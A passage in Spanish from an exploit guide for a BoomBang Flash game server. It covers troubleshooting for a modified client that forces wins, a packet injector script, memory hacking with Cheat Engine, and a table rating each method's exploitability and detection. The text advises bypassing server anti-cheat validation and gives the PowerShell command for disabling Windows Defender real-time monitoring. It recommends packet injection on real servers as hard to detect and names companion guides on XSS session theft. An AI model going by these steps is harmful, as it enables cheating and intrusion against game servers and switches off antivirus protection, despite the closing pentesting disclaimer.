   ```

3. **Servidor no está escuchando**
   ```bash
   # Verificar que el servidor BoomBang esté corriendo
   ps aux | grep boombang
   ```

**Solución:**
```bash
# Usar IP correcta (verificar con ifconfig o ipconfig)
python3 lianas_packet_injector.py --server 127.0.0.1 --port 7200 ...
```

---

### Problema: "JPEXS no puede guardar el .swf modificado"

**Síntomas:**
```
Error: Cannot save file
ActionScript compilation failed
```

**Causas:**

1. **Error de sintaxis en el código**
   - Verificar que todos los puntos y coma estén presentes
   - Verificar que las comillas estén balanceadas
   - Verificar que los paréntesis estén cerrados

**Solución:**
```actionscript
// INCORRECTO:
this._bg10612._rj8693(myUserId, myUserId, myUsername, "1000")  // Falta ;

// CORRECTO:
this._bg10612._rj8693(myUserId, myUserId, myUsername, "1000");
```

2. **Variables no definidas**
   ```actionscript
   // INCORRECTO:
   var myUserId:int = Session.User.id;  // Session puede no estar en scope

   // CORRECTO:
   var myUserId:int = this.getUserId();  // Usar método existente
   ```

**Solución general:**
```
1. Click en "Check Syntax" antes de guardar
2. Revisar errores en la consola de JPEXS
3. Si hay errores, corregir y reintentar
```

---

### Problema: "Cheat Engine no encuentra el proceso de Flash"

**Síntomas:**
```
No processes found
```

**Solución:**

```bash
# 1. Verificar que Flash Player está corriendo
# Windows:
tasklist | findstr flash

# macOS:
ps aux | grep -i flash

# Linux:
ps aux | grep -i flash

# 2. Ejecutar Cheat Engine como administrador
# Windows: Click derecho > Run as Administrator
# macOS: sudo cheatengine
# Linux: sudo cheatengine

# 3. Usar nombre exacto del proceso
# Puede ser:
# - flashplayer.exe
# - flashplayer_32_sa.exe
# - flashplayer_32_sa_debug.exe
# - Flash Player
```

---

### Problema: "El exploit no funciona, sigo perdiendo"

**Diagnóstico:**

1. **Verificar que el cliente modificado se está cargando**
   ```javascript
   // Abrir DevTools (F12) en el navegador
   // Console tab
   // Buscar log:
   [EXPLOIT] Victoria forzada para: TuNombre

   // Si NO aparece, el cliente NO está modificado
   ```

2. **Verificar que el servidor acepta paquetes modificados**
   ```bash
   # Interceptar tráfico con Wireshark
   # Filtrar: tcp.port == 7200
   # Buscar paquete con Opcode 125
   # Verificar que contiene tus datos modificados
   ```

3. **Verificar que NO hay validación adicional**
   ```
   # Revisar logs del servidor (si tienes acceso)
   tail -f /var/log/boombang/game.log

   # Buscar mensajes como:
   [ANTI-CHEAT] Invalid game result detected
   ```

**Solución:**

Si el servidor tiene validación adicional (no documentada en el código que analizamos), el exploit no funcionará. En ese caso:

1. **Opción A:** Buscar la validación en el código del servidor y bypassearla
2. **Opción B:** Usar un exploit diferente (memory hacking en lugar de packet injection)
3. **Opción C:** Aceptar que este servidor particular tiene protecciones adicionales

---

### Problema: "Windows Defender bloquea los scripts"

**Síntomas:**
```
Threat detected: Trojan:Win32/Wacatac
File has been deleted
```

**Causa:**
- Scripts de hacking suelen ser marcados como malware por antivirus

**Solución:**

```
1. Windows Security > Virus & threat protection
2. Manage settings
3. Exclusions > Add or remove exclusions
4. Add an exclusion > Folder
5. Seleccionar carpeta con los scripts
```

**O ejecutar sin antivirus:**
```bash
# TEMPORAL: Desactivar Windows Defender
# (SOLO para testing, reactivar después)

# PowerShell como administrador:
Set-MpPreference -DisableRealtimeMonitoring $true

# Ejecutar scripts

# Reactivar:
Set-MpPreference -DisableRealtimeMonitoring $false
```

---

## 📊 Resumen de Explotabilidad

| Exploit | Explotabilidad | Dificultad | Tiempo | Detección |
|---|---|---|---|---|
| Cliente modificado | 100% | Baja | 30 min | Media |
| Packet injection | 90% | Media | 45 min | Baja |
| Memory hacking | 70% | Alta | 90 min | Muy baja |

### Recomendación

Para pentesting en VPS reales, **usar Packet Injection**:
- ✅ No requiere modificar cliente (menos obvio)
- ✅ Funciona remotamente
- ✅ Difícil de detectar sin logs del servidor
- ✅ Script automatizado

---

## 🎓 Para Aprender Más

**Herramientas necesarias:**
- JPEXS Free Flash Decompiler: https://github.com/jindrapetrik/jpexs-decompiler
- Cheat Engine: https://www.cheatengine.org/
- Wireshark: https://www.wireshark.org/
- Python 3: https://www.python.org/

**Archivos relacionados:**
- `MecanicasRing.md` - Análisis del juego Ring
- `xss_sesionesYObjetos_100.md` - Robo de sesiones (complementario)
- `duplicacion_objetos_30.md` - Duplicación de objetos

---

**Documentación creada para:** Pentesting en entornos de no producción
**Nivel:** Junior-Intermedio (explicaciones detalladas + código funcional)
**Uso responsable:** SOLO en servidores propios o con autorización explícita

⚠️ **LEGAL DISCLAIMER:** El uso no autorizado de estas técnicas en servidores de producción puede resultar en consecuencias legales. Esta documentación es SOLO para propósitos educativos y pentesting autorizado.
